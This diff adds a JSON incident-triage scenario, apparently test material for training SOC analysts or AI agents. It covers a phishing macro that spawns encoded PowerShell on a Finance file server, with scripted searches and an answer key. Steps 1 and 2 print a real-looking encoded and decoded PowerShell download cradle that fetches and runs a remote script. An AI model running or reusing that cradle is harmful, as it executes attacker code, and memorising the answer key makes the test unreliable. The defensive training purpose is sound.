@@ -1,0 +1,157 @@
+{
+  "id": "powershell_encoded_cmd",
+  "title": "Encoded PowerShell Spawned by Office Document",
+  "category": "endpoint",
+  "short_description": "EDR fired on hoth-fs01 after WINWORD.EXE spawned an obfuscated PowerShell command moments after an email attachment was opened.",
+  "alert": {
+    "rule_name": "Endpoint - Encoded PowerShell Command Execution",
+    "time": "2026-06-12T09:42:11Z",
+    "host": "hoth-fs01",
+    "user": "FROTHLY\\fsmith",
+    "source": "EDR (Endpoint Detection & Response)",
+    "severity": "high",
+    "description": "powershell.exe was launched with -EncodedCommand by WINWORD.EXE on host hoth-fs01, approximately 90 seconds after the user opened an email attachment.",
+    "raw": "06/12/2026 09:42:11 EDR-ALERT host=hoth-fs01 user=FROTHLY\\fsmith rule=\"Encoded PowerShell Command Execution\" process=powershell.exe parent=WINWORD.EXE severity=high"
+  },
+  "steps": [
+    {
+      "step": 1,
+      "tool": "splunk_search",
+      "title": "Pull EDR process-creation events around the alert time",
+      "match_any": ["process", "parentimage", "winword", "edr", "endpoint", "powershell.exe", "hoth-fs01"],
+      "spl": "search index=endpoint host=\"hoth-fs01\" earliest=\"2026-06-12T09:40:00\" latest=\"2026-06-12T09:45:00\" (Image=\"*powershell.exe\" OR ParentImage=\"*WINWORD.EXE\") | table _time, host, User, Image, ParentImage, ParentCommandLine, CommandLine",
+      "result": {
+        "result_count": 2,
+        "events": [
+          {
+            "_time": "2026-06-12T09:42:08Z",
+            "host": "hoth-fs01",
+            "User": "FROTHLY\\fsmith",
+            "Image": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
+            "EventAction": "process_opened_file",
+            "TargetFile": "C:\\Users\\fsmith\\AppData\\Local\\Temp\\Q3_Vendor_Invoice.docm"
+          },
+          {
+            "_time": "2026-06-12T09:42:11Z",
+            "host": "hoth-fs01",
+            "User": "FROTHLY\\fsmith",
+            "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+            "ParentImage": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
+            "ParentCommandLine": "\"WINWORD.EXE\" /n \"C:\\Users\\fsmith\\AppData\\Local\\Temp\\Q3_Vendor_Invoice.docm\"",
+            "CommandLine": "powershell.exe -nop -w hidden -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA4ADUALgAyADIAMAAuADEAMAAxAC4ANAA3AC8AdQBwAGQALgBwAHMAMQAnACkA"
+          }
+        ]
+      },
+      "indicator_tags": ["office_spawned_shell", "encoded_powershell", "phishing_attachment"]
+    },
+    {
+      "step": 2,
+      "tool": "saia_generate_spl",
+      "title": "Decode the -EncodedCommand payload",
+      "match_any": ["decode", "base64", "encodedcommand", "cmdline", "encoded command", "command line"],
+      "spl": "| makeresults | eval cmd=\"SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA4ADUALgAyADIAMAAuADEAMAAxAC4ANAA3AC8AdQBwAGQALgBwAHMAMQAnACkA\" | eval decoded=base64decode(cmd)",
+      "result": {
+        "explanation": "The -EncodedCommand argument is UTF-16LE Base64. Decoding it yields a single-line download cradle.",
+        "decoded_command": "IEX (New-Object Net.WebClient).DownloadString('http://185.220.101.47/upd.ps1')"
+      },
+      "indicator_tags": ["download_cradle"]
+    },
+    {
+      "step": 3,
+      "tool": "splunk_search",
+      "title": "Search network/proxy logs for connections to 185.220.101.47",
+      "match_any": ["185.220.101.47", "network", "proxy", "connection", "outbound", "beacon"],
+      "spl": "search index=network (dest_ip=\"185.220.101.47\" OR dest=\"185.220.101.47\") host=\"hoth-fs01\" earliest=\"2026-06-12T09:42:00\" latest=\"2026-06-12T10:30:00\" | stats count earliest(_time) as first_seen latest(_time) as last_seen avg(bytes_out) as avg_bytes by dest_ip, dest_port",
+      "result": {
+        "result_count": 1,
+        "events": [
+          {
+            "dest_ip": "185.220.101.47",
+            "dest_port": 80,
+            "count": 42,
+            "first_seen": "2026-06-12T09:42:14Z",
+            "last_seen": "2026-06-12T10:24:14Z",
+            "avg_bytes": 512,
+            "note": "Connections recur at ~60s intervals - consistent with C2 beaconing."
+          }
+        ]
+      },
+      "indicator_tags": ["c2_beaconing", "suspicious_external_ip"]
+    },
+    {
+      "step": 4,
+      "tool": "splunk_search",
+      "title": "Check DNS resolution history and threat intel for the destination",
+      "match_any": ["dns", "resolve", "domain", "185.220.101.47", "threat intel", "cdn-update"],
+      "spl": "search index=dns (answer=\"185.220.101.47\" OR dest_ip=\"185.220.101.47\") host=\"hoth-fs01\" | table _time, query, answer | append [| inputlookup threat_intel_domains.csv | search domain=\"cdn-update.net\"]",
+      "result": {
+        "result_count": 1,
+        "events": [
+          {
+            "_time": "2026-06-12T09:42:13Z",
+            "query": "cdn-update.net",
+            "answer": "185.220.101.47",
+            "domain_age_days": 4,
+            "registrar": "privacy-protected",
+            "threat_intel_hits": 2,
+            "threat_intel_sources": ["AlienVault OTX", "abuse.ch"]
+          }
+        ]
+      },
+      "indicator_tags": ["newly_registered_domain"]
+    },
+    {
+      "step": 5,
+      "tool": "get_asset_context",
+      "title": "Look up asset context for hoth-fs01",
+      "match_any": ["hoth-fs01", "asset", "host context", "asset context"],
+      "result": {
+        "asset": "hoth-fs01",
+        "category": "File Server",
+        "department": "Finance",
+        "criticality": "high",
+        "owner_team": "IT-Infrastructure",
+        "notes": "Hosts shared Finance drives; 40+ employees have SMB access to this host."
+      },
+      "indicator_tags": []
+    },
+    {
+      "step": 6,
+      "tool": "get_identity_context",
+      "title": "Look up identity context for fsmith",
+      "match_any": ["fsmith", "user context", "identity", "identity context"],
+      "result": {
+        "user": "FROTHLY\\fsmith",
+        "title": "Finance Analyst",
+        "department": "Finance",
+        "mfa_enabled": true,
+        "baseline_risk": "low",
+        "recent_activity": "Opened email attachment 'Q3_Vendor_Invoice.docm' from external sender 'billing@vendor-frothly-support.com' at 09:42:08, two minutes before the alert fired. No other anomalous activity on this account in the last 30 days."
+      },
+      "indicator_tags": []
+    }
+  ],
+  "ground_truth": {
+    "verdict": "true_positive",
+    "severity": "critical",
+    "confidence": 0.95,
+    "narrative": "A malicious macro inside 'Q3_Vendor_Invoice.docm' (delivered via a spoofed vendor email) launched an obfuscated PowerShell download cradle that retrieved a second-stage payload from 185.220.101.47 (cdn-update.net), a domain registered four days ago and already flagged by two threat-intel sources. The host then began beaconing to that address roughly once per minute. hoth-fs01 is a high-criticality Finance file server with broad SMB access, so this represents an active, ongoing compromise with a credible path to lateral movement across Finance data.",
+    "mitre_indicator_tags": [
+      "phishing_attachment",
+      "office_spawned_shell",
+      "encoded_powershell",
+      "download_cradle",
+      "c2_beaconing",
+      "suspicious_external_ip",
+      "newly_registered_domain"
+    ],
+    "recommended_actions": [
+      "Isolate host hoth-fs01 from the network via EDR containment immediately.",
+      "Block 185.220.101.47 and the domain cdn-update.net at the firewall, proxy, and DNS sinkhole.",
+      "Disable fsmith's account pending investigation and force a credential reset on re-enable.",
+      "Quarantine 'Q3_Vendor_Invoice.docm' across all mailboxes and block the sender domain vendor-frothly-support.com.",
+      "Hunt fleet-wide for the same indicators (cdn-update.net, the encoded PowerShell cradle, WINWORD.EXE spawning powershell.exe).",
+      "Open a critical incident with the IR team and capture a forensic image of hoth-fs01 before remediation."
+    ]
+  }
+}
